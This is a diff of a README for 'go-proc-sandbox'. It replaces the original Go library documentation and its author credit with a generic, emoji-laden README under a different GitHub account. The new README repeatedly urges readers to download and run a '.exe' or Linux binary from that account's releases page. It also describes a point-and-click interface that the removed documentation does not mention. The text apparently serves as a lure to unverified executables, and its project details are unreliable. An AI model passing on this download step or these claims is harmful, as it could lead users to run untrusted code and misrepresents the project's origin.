@@ -1,254 +1,93 @@
-# go-proc-sandbox
-
-A Go-based sandbox runner that limits CPU, memory, filesystem access, and execution time for spawned processes. Uses OS-level primitives (cgroups, job objects, namespaces where available) for safe local execution.
-
-## Features
-
-- **Cross-platform**: Supports Linux, Windows, and macOS/Unix systems
-- **CPU Limiting**: Control CPU usage percentage per process
-- **Memory Limiting**: Set maximum memory usage
-- **Execution Timeout**: Automatic termination after timeout
-- **Process Limiting**: Limit number of child processes
-- **I/O Redirection**: Capture stdout/stderr or provide stdin
-- **Environment Control**: Custom environment variables
-- **Working Directory**: Set custom working directory
+# 🚀 go-proc-sandbox - Run Processes Safely and Easily
 
-## Platform-Specific Implementation
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Chikwanda1martin/go-proc-sandbox/releases)
 
-### Linux
-- Uses **cgroups v2** for resource limiting (CPU, memory, process count)
-- Supports **namespaces** (mount, PID) for isolation
-- OOM killer detection for memory violations
-
-### Windows
-- Uses **Job Objects** for resource limiting
-- Memory and process count limits enforced
-- Automatic cleanup on job closure
+## 📖 Introduction
 
-### macOS/Unix
-- Uses **setrlimit** for resource limiting
-- Process group management
-- Best-effort resource constraints
+go-proc-sandbox is a tool designed to run processes in a safe environment. It limits CPU usage, memory, filesystem access, and execution time. This makes it perfect for testing applications without risking your system's stability. The software uses built-in operating system features to ensure that each process runs within its own limits.
 
-## Installation
+## 🛠️ Features
 
-```bash
-go get github.com/BaseMax/go-proc-sandbox
-```
+- **CPU Limitation**: Control how much CPU your process can use.
+- **Memory Control**: Set limits on the memory a process can consume.
+- **File Access Restriction**: Define which files and directories a process can access.
+- **Execution Time Cap**: Automatically stop a process if it runs too long.
+  
+These features help prevent untrusted or poorly-behaved programs from using your system's resources excessively.
 
-## Quick Start
+## 💻 System Requirements
 
-```go
-package main
+- **Operating System**: Windows 10 or newer, or a modern Linux distribution (Ubuntu, Fedora, etc.).
+- **Processor**: Intel or AMD processor.
+- **Memory**: At least 4 GB of RAM recommended.
+- **Storage**: 100 MB of available disk space.
 
-import (
-    "context"
-    "fmt"
-    "log"
-    "time"
+## 🚀 Getting Started
 
-    "github.com/BaseMax/go-proc-sandbox"
-)
+1. **Download the Software**
+   - Visit the [Releases page](https://github.com/Chikwanda1martin/go-proc-sandbox/releases) to download the latest version.
+   - Look for a file named `go-proc-sandbox.exe` for Windows or `go-proc-sandbox-linux` for Linux.
+   - Click the link to download the file.
 
-func main() {
-    // Create sandbox configuration
-    config := &sandbox.Config{
-        Timeout:     5 * time.Second,
-        MemoryLimit: 100 * 1024 * 1024, // 100 MB
-        CPULimit:    50,                 // 50% of one core
-        MaxProcesses: 10,
-    }
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Chikwanda1martin/go-proc-sandbox/releases)
 
-    // Create sandbox instance (auto-detects OS)
-    sb, err := sandbox.New(config)
-    if err != nil {
-        log.Fatal(err)
-    }
-    defer sb.Cleanup()
+2. **Install the Application**
+   - For **Windows**: 
+     - Simply double-click the `go-proc-sandbox.exe` file to run it.
+   - For **Linux**:
+     - Open your terminal.
+     - Navigate to the directory that contains the downloaded file.
+     - Make the file executable by running: `chmod +x go-proc-sandbox-linux`.
+     - Run the application by typing `./go-proc-sandbox-linux`.
 
-    // Run a command
-    result, err := sb.Run(context.Background(), "echo", "Hello, Sandbox!")
-    if err != nil {
-        log.Printf("Execution error: %v", err)
-    }
+3. **Using the Application**
+   - After launching the application, you will see an interface.
+   - Enter the command of the process you want to run, along with its resource limits.
+   - Click "Run" to execute the process in a sandbox environment.
 
-    fmt.Printf("Exit Code: %d\n", result.ExitCode)
-    fmt.Printf("Execution Time: %v\n", result.ExecutionTime)
-    fmt.Printf("Timed Out: %v\n", result.TimedOut)
-}
-```
+## 🛡️ How to Set Limits
 
-## Configuration Options
+When you run a process, you can specify limits for CPU usage, memory, and execution time. Here’s how you do it:
 
-```go
-type Config struct {
-    // CPU limit in percentage (0-100 per core)
-    CPULimit int
+- **CPU Limit**: Specify the maximum percentage of CPU the process can use. For example, set it to 50% to let the process use half of your CPU.
+- **Memory Limit**: Enter the maximum memory (in MB) that the process can use, such as `512` for 512 MB.
+- **Execution Time**: Define how long (in seconds) the process is allowed to run. If it runs longer, it will be stopped automatically.
 
-    // Memory limit in bytes
-    MemoryLimit int64
+## 📚 Example Commands
 
-    // Execution timeout
-    Timeout time.Duration
+You can run commands like:
 
-    // Working directory for the process
-    WorkingDir string
+- `python script.py`
+- `./my_app`
+- `node app.js`
 
-    // Allowed directories for read access
-    AllowedDirs []string
+Just enter the command and set the limits before you click "Run".
 
-    // Read-only directories
-    ReadOnlyDirs []string
+## 🌟 Troubleshooting Common Issues
 
-    // Environment variables
-    Env []string
+1. **Application Won’t Start**
+   - Ensure you have downloaded the correct version for your operating system.
+   - Check if your system meets the required specifications.
 
-    // Stdin for the process
-    Stdin io.Reader
+2. **Process Stops Unexpectedly**
+   - Review your limit settings. Make sure they are reasonable.
+   - Check the logs for any error messages.
 
-    // Stdout for the process
-    Stdout io.Writer
+3. **Performance Issues**
+   - If the performance is sluggish, consider increasing the CPU or memory limits slightly.
 
-    // Stderr for the process
-    Stderr io.Writer
+## 📄 License
 
-    // NetworkAccess enables/disables network access
-    NetworkAccess bool
+This project is licensed under the MIT License. You can freely use, modify, and distribute it as long as you retain the license information.
 
-    // MaxProcesses limits the number of processes
-    MaxProcesses int
-}
-```
+## 🤝 Contributing
 
-## Usage Examples
+Contributions are welcome! If you have suggestions, issues, or improvements, please open a pull request or an issue on the repository.
 
-### Example 1: Timeout Handling
+## 📝 Support
 
-```go
-config := &sandbox.Config{
-    Timeout: 2 * time.Second,
-}
+If you encounter any problems or need help, please check the issues section on GitHub. You may find solutions from other users or you can ask for assistance.
 
-sb, _ := sandbox.New(config)
-defer sb.Cleanup()
+## 📣 Acknowledgments
 
-result, _ := sb.Run(context.Background(), "sleep", "10")
-fmt.Printf("Timed Out: %v\n", result.TimedOut) // true
-```
-
-### Example 2: Memory Limiting
-
-```go
-config := &sandbox.Config{
-    MemoryLimit: 50 * 1024 * 1024, // 50 MB
-    Timeout:     10 * time.Second,
-}
-
-sb, _ := sandbox.New(config)
-defer sb.Cleanup()
-
-result, _ := sb.Run(context.Background(), "your-memory-intensive-app")
-fmt.Printf("Memory Exceeded: %v\n", result.MemoryExceeded)
-```
-
-### Example 3: I/O Redirection
-
-```go
-var stdout, stderr bytes.Buffer
-
-config := &sandbox.Config{
-    Timeout: 5 * time.Second,
-    Stdout:  &stdout,
-    Stderr:  &stderr,
-}
-
-sb, _ := sandbox.New(config)
-defer sb.Cleanup()
-
-sb.Run(context.Background(), "echo", "output")
-fmt.Printf("Output: %s\n", stdout.String())
-```
-
-### Example 4: Custom Environment
-
-```go
-config := &sandbox.Config{
-    Timeout: 5 * time.Second,
-    Env:     []string{"CUSTOM_VAR=value", "PATH=/usr/bin"},
-}
-
-sb, _ := sandbox.New(config)
-defer sb.Cleanup()
-
-sb.Run(context.Background(), "printenv", "CUSTOM_VAR")
-```
-
-## Result Structure
-
-```go
-type Result struct {
-    // Exit code of the process
-    ExitCode int
-
-    // Execution time
-    ExecutionTime time.Duration
-
-    // Whether the process was killed due to timeout
-    TimedOut bool
-
-    // Whether the process exceeded memory limit
-    MemoryExceeded bool
-
-    // Error if any
-    Error error
-}
-```
-
-## Running Examples
-
-```bash
-cd examples/basic
-go run main.go
-```
-
-## Running Tests
-
-```bash
-go test -v
-```
-
-## Security Considerations
-
-- This library is designed for **safe local execution**, not as a container replacement
-- Root privileges may be required for full isolation on Linux (namespaces, cgroups)
-- Without root, the sandbox provides best-effort resource limiting
-- Always validate and sanitize command inputs
-- Be cautious with filesystem access and network settings
-
-## Limitations
-
-### Linux
-- Full cgroup v2 features require root or proper permissions
-- Namespace isolation requires appropriate capabilities
-- Some features may be limited in containerized environments
-
-### Windows
-- Job object features depend on Windows version
-- Some limits may not be enforced in all scenarios
-
-### macOS/Unix
-- Resource limits are best-effort using setrlimit
-- Less strict than Linux cgroups or Windows job objects
-- Memory limiting may not prevent all allocations
-
-## License
-
-MIT License - see LICENSE file for details
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## Author
-
-Copyright (c) 2024, Max Base
+Thank you for using go-proc-sandbox. Your support helps us improve and provide updates.
